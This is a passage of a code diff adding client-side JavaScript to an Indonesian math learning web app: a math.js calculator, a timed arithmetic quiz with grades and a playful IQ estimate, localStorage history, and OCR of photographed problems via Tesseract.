+                const tingkat = data.tingkat || 'sd';
+                
+                let tableRows = '';
+                for (let i = 0; i < hasil.length; i++) {
+                    const item = hasil[i];
+                    const statusClass = item.status === 'benar' ? 'result-benar' : 'result-salah';
+                    const ratingValue = item.status === 'benar' ? '1/1' : '0/1';
+                    const nilaiValue = item.status === 'benar' ? 100 : 0;
+                    tableRows += `
+                        <tr>
+                            <td>${item.soal}</td>
+                            <td class="${statusClass}">${ratingValue}</td>
+                            <td class="${statusClass}">${nilaiValue}</td>
+                        </tr>
+                    `;
+                }
+                resultTableBody.innerHTML = tableRows || '<tr><td colspan="3" style="text-align: center;">Tidak ada data soal</td></tr>';
+                document.getElementById('nilaiAkhir').textContent = nilaiAkhir;
+                
+                let predikat = '';
+                if (nilaiAkhir >= 90) predikat = '🌟 A (Sangat Baik)';
+                else if (nilaiAkhir >= 80) predikat = '📘 B (Baik)';
+                else if (nilaiAkhir >= 70) predikat = '📙 C (Cukup)';
+                else if (nilaiAkhir >= 60) predikat = '📕 D (Kurang)';
+                else predikat = '⚠️ E (Perlu Belajar Lagi)';
+                document.getElementById('predikatAkhir').textContent = predikat;
+                
+                const iq = estimasiIQ(tingkat, nilaiAkhir);
+                const kategori = getKategoriIQ(iq);
+                document.getElementById('iqEstimasiDisplay').textContent = iq;
+                document.getElementById('iqKategoriDisplay').textContent = kategori.label;
+                document.getElementById('iqKategoriDisplay').style.background = `rgba(99,102,241,0.2)`;
+                document.getElementById('iqKategoriDisplay').style.borderColor = kategori.color;
+                document.getElementById('iqKategoriDisplay').style.color = kategori.color;
+                
+                let detailText = `Tingkat: ${tingkat.toUpperCase()} | Usia: `;
+                if (tingkat === 'tk') detailText += '4-6 tahun';
+                else if (tingkat === 'sd') detailText += '6-12 tahun';
+                else if (tingkat === 'smp') detailText += '12-15 tahun';
+                else if (tingkat === 'sma') detailText += '15-18 tahun';
+                else if (tingkat === 'mahasiswa') detailText += '18-20 tahun';
+                document.getElementById('iqDetailDisplay').textContent = detailText;
+                
+                nilaiAkhirContainer.style.display = 'block';
+            } else {
+                resultTableBody.innerHTML = '<tr><td colspan="3" style="text-align: center;">Belum ada data ujian. Mulai ujian dulu!</td></tr>';
+                nilaiAkhirContainer.style.display = 'none';
+            }
+            
+            showSection('result');
+        }
+
+        function resetAndHome() { showSection('mainMenu'); }
+
+        function showSection(sectionId) {
+            if (sectionId !== 'quiz') { isQuizActive = false; stopTimer(); }
+            document.querySelectorAll('.card').forEach(card => card.classList.add('hidden'));
+            const target = document.getElementById(sectionId);
+            if (target) target.classList.remove('hidden');
+            
+            document.querySelectorAll('.nav-item').forEach(btn => btn.classList.remove('active'));
+            const navMap = { 'mainMenu':0, 'calculator':1, 'quiz':2, 'result':3, 'history':4, 'profile':5, 'customSoal':0, 'chatOwner':0 };
+            const items = document.querySelectorAll('.nav-item');
+            if (navMap[sectionId] !== undefined && items[navMap[sectionId]]) {
+                items[navMap[sectionId]].classList.add('active');
+            }
+            window.scrollTo(0, 0);
+            if (sectionId === 'history') displayHistory();
+            if (sectionId === 'profile') loadProfile();
+        }
+
+        function displayHistory() {
+            const list = document.getElementById('historyList');
+            if (calculationHistory.length === 0) {
+                list.innerHTML = '<div style="text-align:center;color:var(--text-muted);padding:20px;">Belum ada riwayat</div>';
+                return;
+            }
+            list.innerHTML = calculationHistory.slice(-20).reverse().map(item => `
+                <div class="history-item">
+                    <div style="font-family: monospace; color: #fff; font-weight:600;">${item.expression}</div>
+                    <div style="color: #10b981; font-weight: bold; font-size: 1.1rem;">= ${item.result}</div>
+                    <small style="color: var(--text-muted); font-size: 0.7rem;">${item.timestamp}</small>
+                </div>
+            `).join('');
+        }
+
+        function addToHistory(expr, result) {
+            calculationHistory.push({ expression: expr, result: result, timestamp: new Date().toLocaleString('id-ID') });
+            if (calculationHistory.length > 50) calculationHistory = calculationHistory.slice(-50);
+            localStorage.setItem('mathAppHistory', JSON.stringify(calculationHistory));
+        }
+
+        function clearHistory() {
+            calculationHistory = [];
+            localStorage.setItem('mathAppHistory', JSON.stringify(calculationHistory));
+            displayHistory();
+        }
+
+        // ===== KALKULATOR =====
+        function updateCalcDisplay() {
+            document.getElementById('calcDisplay').textContent = calcExpression || '0';
+        }
+
+        function appendCalc(val) {
+            calcExpression += val;
+            updateCalcDisplay();
+        }
+
+        function clearCalc() {
+            calcExpression = '';
+            updateCalcDisplay();
+            document.getElementById('outputHasilCalc').textContent = '';
+        }
+
+        function backspaceCalc() {
+            calcExpression = calcExpression.slice(0, -1);
+            updateCalcDisplay();
+        }
+
+        function evaluasiEkspresi(ekspresi) {
+            try {
+                let normalized = ekspresi
+                    .replace(/×/g, '*').replace(/÷/g, '/')
+                    .replace(/π/g, 'pi').replace(/√(\d+)/g, 'sqrt($1)')
+                    .replace(/√\(([^)]+)\)/g, 'sqrt($1)')
+                    .replace(/(\d+)%/g, '($1/100)')
+                    .replace(/\^/g, '^');
+                const result = math.evaluate(normalized);
+                if (math.typeOf(result) === 'BigNumber') return result.toString();
+                if (typeof result === 'number') {
+                    if (Number.isInteger(result)) return result.toString();
+                    return parseFloat(result.toFixed(10)).toString();
+                }
+                return result.toString();
+            } catch (e) {
+                throw new Error('Syntax Error');
+            }
+        }
+
+        async function hitungCalc() {
+            if (!calcExpression) { document.getElementById('outputHasilCalc').innerHTML = '<span style="color:#ef4444">Input kosong</span>'; return; }
+            try {
+                const hasil = evaluasiEkspresi(calcExpression);
+                document.getElementById('outputHasilCalc').innerHTML = `<span class="output-result">${hasil}</span>`;
+                addToHistory(calcExpression, hasil);
+            } catch (err) {
+                document.getElementById('outputHasilCalc').innerHTML = `<span style="color:#ef4444">❌ ${err.message}</span>`;
+            }
+        }
+
+        // ===== QUIZ =====
+        function updateQuizOptions() {
+            const level = document.getElementById('tingkatPendidikan').value;
+            const jenisSoalSelect = document.getElementById('jenisSoal');
+            const advanced = ['^', '√'];
+            for (let opt of jenisSoalSelect.options) {
+                opt.disabled = (level === 'tk' || level === 'sd') && advanced.includes(opt.value);
+            }
+        }
+
+        function mulaiQuiz() {
+            const level = document.getElementById('tingkatPendidikan').value;
+            const jenis = document.getElementById('jenisSoal').value;
+            skor = 0; poolSoal = []; indexSoal = 0; hasilPerSoal = [];
+            for (let i = 0; i < 10; i++) poolSoal.push(generateQuizSoal(level, jenis));
+            isQuizActive = true;
+            resetTimer();
+            startTimer();
+            tampilkanSoal(indexSoal);
+            document.getElementById('quizScore').textContent = `SCORE: ${skor}`;
+            document.getElementById('quizFeedback').textContent = '';
+        }
+
+        function generateQuizSoal(level, jenis) {
+            const ranges = { 'tk':[1,10], 'sd':[1,100], 'smp':[1,1000], 'sma':[1,10000], 'mahasiswa':[1,100000] };
+            const [min, max] = ranges[level] || [1,100];
+            let a = Math.floor(Math.random() * (max - min + 1)) + min;
+            let b = Math.floor(Math.random() * (max - min + 1)) + min;
+            if (jenis === 'acak') {
+                const types = ['+','-','*','/'];
+                if (level !== 'tk' && level !== 'sd') types.push('^', '√');
+                jenis = types[Math.floor(Math.random() * types.length)];
+            }
+            let soal = '', hasil = '';
+            switch(jenis) {
+                case '+': soal = `${a} + ${b}`; hasil = (a+b).toString(); break;
+                case '-': if (level==='tk'||level==='sd') [a,b]=[Math.max(a,b),Math.min(a,b)]; soal = `${a} - ${b}`; hasil = (a-b).toString(); break;
+                case '*': if (level==='tk'||level==='sd') { a=Math.min(a,10); b=Math.min(b,10); } soal = `${a} × ${b}`; hasil = (a*b).toString(); break;
+                case '/': b=Math.max(b,1); a=a*b; soal = `${a} ÷ ${b}`; hasil = (a/b).toString(); break;
+                case '^': soal = `${a}²`; hasil = (a*a).toString(); break;
+                case '√': const akar = Math.floor(Math.random()*12)+1; soal = `√${akar*akar}`; hasil = akar.toString(); break;
+            }
+            return { soal, hasil };
+        }
+
+        function tampilkanSoal(idx) {
+            if (idx >= poolSoal.length) {
+                isQuizActive = false; stopTimer();
+                document.getElementById('quizSoal').innerHTML = '<span class="soal-display">🎉 Ujian Selesai!</span>';
+                document.getElementById('jawabanQuiz').value = '';
+                document.getElementById('btnNextSoal').style.display = 'none';
+                document.getElementById('quizFeedback').innerHTML = `<span style="color:var(--success)">✨ Skor Akhir: ${skor}/${poolSoal.length}</span>`;
+                simpanHasilUjian();
+                return;
+            }
+            const current = poolSoal[idx];
+            currentSoal = current.soal;
+            currentHasil = current.hasil;
+            document.getElementById('quizSoal').innerHTML = `<span class="soal-display">${currentSoal}</span>`;
+            document.getElementById('jawabanQuiz').value = '';
+            document.getElementById('quizFeedback').textContent = '';
+            document.getElementById('btnNextSoal').style.display = 'none';
+        }
+
+        function cekJawaban() {
+            if (!isQuizActive) { document.getElementById('quizFeedback').innerHTML = '<span style="color:#ef4444">Ujian belum dimulai!</span>'; return; }
+            const jawabanUser = document.getElementById('jawabanQuiz').value.trim();
+            const feedback = document.getElementById('quizFeedback');
+            if (!jawabanUser) { feedback.innerHTML = '<span style="color:#ef4444">Isi jawaban!</span>'; return; }
+            try {
+                const userAns = parseFloat(jawabanUser);
+                const correctAns = parseFloat(currentHasil);
+                const isCorrect = !isNaN(userAns) && !isNaN(correctAns) ? Math.abs(userAns - correctAns) < 0.0001 : jawabanUser.toLowerCase() === currentHasil.toLowerCase();
+                hasilPerSoal.push({
+                    soal: currentSoal,
+                    jawabanUser: jawabanUser,
+                    jawabanBenar: currentHasil,
+                    status: isCorrect ? 'benar' : 'salah',
+                    rating: isCorrect ? '1/1' : '0/1',
+                    nilai: isCorrect ? 100 : 0
+                });
+                if (isCorrect) { feedback.innerHTML = '<span style="color:#10b981;font-weight:bold;">✅ BENAR!</span>'; skor++; }
+                else { feedback.innerHTML = `<span style="color:#ef4444">❌ Salah. Jawabannya: ${currentHasil}</span>`; }
+                document.getElementById('quizScore').textContent = `SCORE: ${skor}`;
+                document.getElementById('btnNextSoal').style.display = 'block';
+                stopTimer();
+            } catch { feedback.innerHTML = '<span style="color:#ef4444">Format salah</span>'; }
+        }
+
+        function nextSoal() {
+            indexSoal++;
+            if (indexSoal < poolSoal.length) { tampilkanSoal(indexSoal); resetTimer(); startTimer(); }
+            else tampilkanSoal(indexSoal);
+        }
+
+        // ===== CUSTOM & OCR =====
+        async function hitungCustomSoal() {
+            const soal = document.getElementById('soalUser').value.trim();
+            const output = document.getElementById('outputCustomSoal');
+            if (!soal) { output.innerHTML = '<span style="color:#ef4444">Input kosong</span>'; return; }
+            try {
+                const hasil = evaluasiEkspresi(soal);
+                output.innerHTML = `<span class="output-result">Result: ${hasil}</span>`;
+                addToHistory(soal, hasil);
+            } catch (err) {
+                output.innerHTML = `<span style="color:#ef4444">❌ ${err.message}</span>`;
+            }
+        }
+
+        async function kirimFotoSoal() {
+            const fileInput = document.getElementById('fotoSoal');
+            const preview = document.getElementById('previewFoto');
+            if (fileInput.files.length === 0) { preview.innerHTML = '<span style="color:#ef4444">Pilih gambar!</span>'; return; }
+            const file = fileInput.files[0];
+            const imgURL = URL.createObjectURL(file);
+            preview.innerHTML = `<img src="${imgURL}" style="max-width:100%; border-radius:10px; margin-bottom:10px;">`;
+            preview.innerHTML += '<div class="loading">🔍 Scanning AI...</div>';
+            try {
+                const { data: { text } } = await Tesseract.recognize(file, 'eng');
+                let cleaned = text.replace(/[Oo]/g,'0').replace(/[lI]/g,'1').replace(/[^0-9+\-*/.()√π=%\s]/g,'').replace(/\s+/g,' ').trim();
+                preview.querySelector('.loading').remove();
+                preview.innerHTML += `<div style="background:rgba(0,0,0,0.3); padding:10px; border-radius:8px; margin-bottom:5px;">Detected: <strong>${cleaned}</strong></div>`;
+                if (cleaned) {
+                    const hasil = evaluasiEkspresi(cleaned);
+                    preview.innerHTML += `<div class="output-result" style="font-size:1.2rem;">= ${hasil}</div>`;
+                    addToHistory(cleaned, hasil);
+                } else { preview.innerHTML += '<div style="color:#ef4444">Teks tidak terbaca</div>'; }
+            } catch(err) { preview.innerHTML += `<div style="color:#ef4444">Error: ${err.message}</div>`; }
+        }
+
+        // Init
+        document.addEventListener('DOMContentLoaded', function() {
+            displayHistory();
+            window.mod = function(a,b) { return a % b; };
+            updateTimerDisplay();
+            updateCalcDisplay();
+            loadProfile();
+        });
     </script>
 </body>
 </html>
